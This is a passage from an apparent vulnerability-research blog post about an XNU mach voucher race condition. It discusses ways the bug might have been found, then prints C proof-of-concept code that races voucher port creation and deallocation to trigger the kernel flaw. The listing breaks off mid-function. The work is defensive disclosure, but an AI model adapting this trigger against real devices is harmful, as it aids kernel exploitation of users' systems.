 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>With the insight that you need to trigger these two race windows (the non-atomic increment to make </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;one too low, then the last-ref vs revive race) it&#39;s trivial to write a PoC to demonstrate the issue; simply allocate and deallocate voucher ports on two threads, with at least one of them using a </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span class="BGLtzooHlW-c10">&nbsp;sub-recipe command. Pretty quickly you&#39;ll hit the two race conditions correctly.</span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.fapbpabhxf26"><span>Conclusions</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">It&#39;s interesting to think about how this vulnerability might have been found. Certainly somebody did find it, and trying to figure out how they might have done that can help us improve our vulnerability research techniques. I&#39;ll offer four possibilities:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">1) Just read the code</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Possible, but this vulnerability is quite deep in the code. This would have been a marathon auditing effort to find and determine that it was exploitable. On the other hand this attack surface is reachable from every sandbox making vulnerabilities here very valuable and perhaps worth the investment.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">2) Static lock-analysis tooling</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>This is something which we&#39;ve discussed within Project Zero over many afternoon coffee chats: could we build a tool to generate a fuzzy mapping between locks and objects which are probably meant to be protected by those locks, and then list any discrepancies where the lock isn&#39;t held? In this particular case </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;is only modified in two places; one time the </span><span class="BGLtzooHlW-c11">user_data_lock</span><span class="BGLtzooHlW-c10">&nbsp;is held and the other time it isn&#39;t. Perhaps tooling isn&#39;t even required and this could just be a technique used to help guide auditing towards possible race-condition vulnerabilities.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">3) Dynamic lock-analysis tooling</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Perhaps tools like </span><span class="BGLtzooHlW-c21"><a class="BGLtzooHlW-c251" href="https://clang.llvm.org/docs/ThreadSanitizer.html">ThreadSanitizer</a></span><span class="BGLtzooHlW-c10">&nbsp;could be used to dynamically record a mapping between locks and accessed objects/object fields. Such a tool could plausibly have flagged this race condition under normal system use. The false positive rate of such a tool might be unusably high however.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">4) Race-condition fuzzer</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>It&#39;s not inconceivable that a coverage-guided fuzzer could have generated the proof-of-concept shown below, though it would specifically have to have been built to execute parallel testcases.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">As to what technique was actually used, we don&#39;t know. As defenders we need to do a better job making sure that we invest even more effort in all of these possibilities and more.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.hmmckgsh9ct0"><span class="BGLtzooHlW-c20">PoC:</span></h2><a id="t.236cca22f08a2d4239acb5bcd559819eddfeeef7"></a><a id="t.57"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;stdio.h&gt;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;stdlib.h&gt;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;unistd.h&gt;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;pthread.h&gt;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;mach/mach.h&gt;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;mach/mach_voucher.h&gt;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;atm/atm_types.h&gt;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#include</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c16">&lt;voucher/ipc_pthread_priority_types.h&gt;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">// @i41nbeer</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c3">&nbsp;mach_port_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">create_voucher_from_recipe</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;recipe</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;size_t recipe_size</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; mach_port_t voucher </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_PORT_NULL</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; kern_return_t kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;host_create_mach_voucher</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mach_host_self</span><span class="BGLtzooHlW-c2">(),</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_raw_recipe_array_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; recipe_size</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">kr </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; printf</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c16">&quot;failed to create voucher from recipe\n&quot;</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;voucher</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">create_single_variable_userdata_voucher_recipe</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;buf</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;size_t len</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;size_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;template_size_out</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; size_t recipe_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">))</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">+</span><span class="BGLtzooHlW-c4">&nbsp;len</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;recipe </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;calloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">recipe_size</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">key </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">command </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">content_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;len</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; uint8_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;content_buf </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">uint8_t</span><span class="BGLtzooHlW-c2">*)</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">)+</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; memcpy</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">content_buf</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;buf</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;len</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">template_size_out </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;recipe_size</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;recipe</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">create_single_variable_userdata_then_redeem_voucher_recipe</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;buf</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;size_t len</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;size_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;template_size_out</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; size_t recipe_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">2</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">))</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">+</span><span class="BGLtzooHlW-c4">&nbsp;len</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;recipe </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;calloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">recipe_size</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">key </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">command </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">content_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;len</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">&nbsp; &nbsp; </span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; uint8_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;content_buf </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">uint8_t</span><span class="BGLtzooHlW-c2">*)</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">)+</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; memcpy</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">content_buf</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;buf</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;len</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;recipe2 </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">*)(</span><span class="BGLtzooHlW-c4">content_buf </span><span class="BGLtzooHlW-c2">+</span><span class="BGLtzooHlW-c4">&nbsp;len</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe2</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">key </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; recipe2</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">command </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_REDEEM</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">template_size_out </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;recipe_size</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;recipe</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;recipe_template_meta </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;recipe</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; size_t recipe_size</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;recipe_template_meta single_recipe_template </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{};</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;recipe_template_meta redeem_recipe_template </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{};</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">int</span><span class="BGLtzooHlW-c4">&nbsp;iter_limit </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">100000</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;s3threadfunc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;arg</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;recipe_template_meta</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">template</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;recipe_template_meta</span><span class="BGLtzooHlW-c2">*)</span><span class="BGLtzooHlW-c4">arg</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">for</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">int</span><span class="BGLtzooHlW-c4">&nbsp;i </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp;i </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;iter_limit</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp;i</span><span class="BGLtzooHlW-c2">++)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_port_t voucher_port </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;create_voucher_from_recipe</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">template</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">template</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">recipe_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_port_deallocate</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_task_self</span><span class="BGLtzooHlW-c2">(),</span><span class="BGLtzooHlW-c4">&nbsp;voucher_port</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;NULL</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c4">&nbsp;sploit_3</span><span class="BGLtzooHlW-c2">()</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
